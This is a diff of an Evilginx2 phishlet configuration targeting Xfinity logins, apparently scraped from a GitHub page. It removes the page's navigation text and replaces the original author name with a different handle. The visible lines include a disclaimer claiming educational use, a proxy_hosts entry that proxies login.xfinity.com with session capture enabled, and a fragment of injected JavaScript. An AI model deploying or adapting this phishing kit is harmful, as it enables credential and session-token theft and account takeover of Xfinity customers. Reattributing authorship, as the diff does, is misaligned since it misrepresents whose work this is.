@@ -1,38 +1,7 @@
-Skip to content
-Search or jump to…
-Pull requests
-Issues
-Codespaces
-Marketplace
-Explore
- 
-@swagboy2208 
-An0nUD4Y
-/
-Evilginx2-Phishlets
-Public
-Fork your own copy of An0nUD4Y/Evilginx2-Phishlets
-Code
-Issues
-Pull requests
-Actions
-Projects
-Security
-Insights
-Beta Try the new code view
-Evilginx2-Phishlets/xfinity.yaml
-@An0nUD4Y
-An0nUD4Y Add files via upload
-Latest commit cc2bb8b on Oct 23, 2022
- History
- 1 contributor
-171 lines (163 sloc)  32.5 KB
- 
-
 # AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
 # PLEASE DO NOT MISUSE THIS PHISHLET.
 
-author: '@an0nud4y'
+author: '@Blvkhat'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'xfinity.com', session: true, is_landing: false}
@@ -200,18 +169,3 @@ js_inject:
         return;
       }  
       setTimeout(function(){ lp(); }, 3000);
-Footer
-© 2023 GitHub, Inc.
-Footer navigation
-Terms
-Privacy
-Security
-Status
-Docs
-Contact GitHub
-Pricing
-API
-Training
-Blog
-About
-Evilginx2-Phishlets/xfinity.yaml at master · An0nUD4Y/Evilginx2-Phishlets
